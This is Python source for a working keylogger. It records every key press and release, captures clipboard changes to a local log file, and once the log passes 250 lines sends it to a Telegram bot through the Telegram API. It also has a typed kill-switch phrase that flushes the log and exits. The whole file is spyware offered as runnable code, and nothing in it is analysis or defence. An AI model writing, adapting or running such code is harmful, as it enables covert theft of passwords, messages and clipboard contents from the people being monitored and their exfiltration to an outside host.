from pynput import keyboard
from datetime import datetime
from pathlib import Path
import pyperclip
import requests

log_file = "recording.txt"
command = ""
clipboard = ""
kill_now = "wecanshutitnow"

# Telegram Stuff
BOT_API = '<REDACTED>'
USER_ID = '<REDACTED>'

def send_telegram_log(content_to_send):
    # Sends a log message to your Telegram via bot.
    try:
        payload = {
            'chat_id': USER_ID,
            'text': content_to_send,
        }
        url = f'https://api.telegram.org/bot{BOT_API}/sendMessage'
        print(url)
        response = requests.post(url, data=payload)
        print(response.text)
        response.raise_for_status()
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

def can_we_send(force = False):
    file_path = Path.cwd() / log_file
    total_content = ""

    with file_path.open('r') as file:
        total_content = file.readlines()
        lines = len(total_content)
    
    content = ''.join(total_content)

    if lines > 250 or force:
        send_telegram_log(content)
        with file_path.open('w') as file:
            file.write('')
    return

def log_it(log_entry):
    file_path = Path.cwd() / log_file

    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log_entry)
    else:
        with file_path.open('a') as file:
            file.write(log_entry)

    print(log_entry, end="")

def kill_switch_activated():
    log_entry = f"Kill switch activated at {datetime.now()}\n"
    log_it(log_entry)
    can_we_send(force = True)
    exit(0)

def asciify(key_pressed):
    key_str = str(key_pressed)

    # Special scan codes
    scan_code_map = {
        "<12>": "numpad 5",
        "<48>": 0, "<49>": 1, "<50>": 2, "<51>": 3, "<52>": 4,
        "<53>": 5, "<54>": 6, "<55>": 7, "<56>": 8, "<57>": 9,
        "<106>": "numpad *",
        "<107>": "numpad +",
        "<109>": "numpad -",
        "<111>": "numpad /",
        "<186>": ";",
        "<187>": "=",
        "<188>": ",",
        "<189>": "-",
        "<190>": ".",
        "<191>": "/",
        "<192>": "`",
        "<222>": "'"
    }

    # Control character to ASCII letter mapping
    control_char_map = {
        '\x01': 'a', '\x02': 'b', '\x03': 'c', '\x04': 'd', '\x05': 'e',
        '\x06': 'f', '\x07': 'g', '\x08': 'h', '\t': 'i', '\n': 'j',
        '\x0b': 'k', '\x0c': 'l', '\r': 'm', '\x0e': 'n', '\x0f': 'o',
        '\x10': 'p', '\x11': 'q', '\x12': 'r', '\x13': 's', '\x14': 't',
        '\x15': 'u', '\x16': 'v', '\x17': 'w', '\x18': 'x', '\x19': 'y',
        '\x1a': 'z', '\x1b': '[', '\x1c': '\\', '\x1d': ']'
    }

    # Priority: scan codes > control characters

    if key_str in scan_code_map:
        return scan_code_map[key_str]

    try:
        key_val = key_pressed.name
    except AttributeError:
        try:
            key_val = key_pressed.char
        except AttributeError:
            return key_str

    # Handle control characters (e.g., Ctrl+A as '\x01')
    for control_code, letter in control_char_map.items():
        if control_code in key_val:
            return letter

    return key_val

def copy_clipboard():
    # Trying to copy the clipboard
    global clipboard

    if pyperclip.paste() != clipboard:
        clipboard = pyperclip.paste()
        log_entry = f"Clipboard: \n\t{clipboard}\n at {datetime.now()}\n"
        log_it(log_entry)
    
    can_we_send()

def on_press_function(key_pressed):
    # A key is pressed
    key = asciify(key_pressed)
    
    log_entry = f"Key pressed:\t{key} at {datetime.now()}\n"
    log_it(log_entry)

    can_we_send()

def on_release_function(key_released):
    # A key is released
    global command

    key = asciify(key_released)
    command += key

    log_entry = f"Key released:\t{key} at {datetime.now()}\n"
    log_it(log_entry)

    try:
        copy_clipboard()
    except:
        pass

    if len(command) > len(kill_now):
        command = command[-len(kill_now):]

    if command == kill_now:
        kill_switch_activated()
    
    can_we_send()

def start_keylogger():
    # Create object for keyboard listener and start listening
    keyboard_listener = keyboard.Listener(on_press = on_press_function, on_release = on_release_function)
    keyboard_listener.start()
    keyboard_listener.join()

start_keylogger()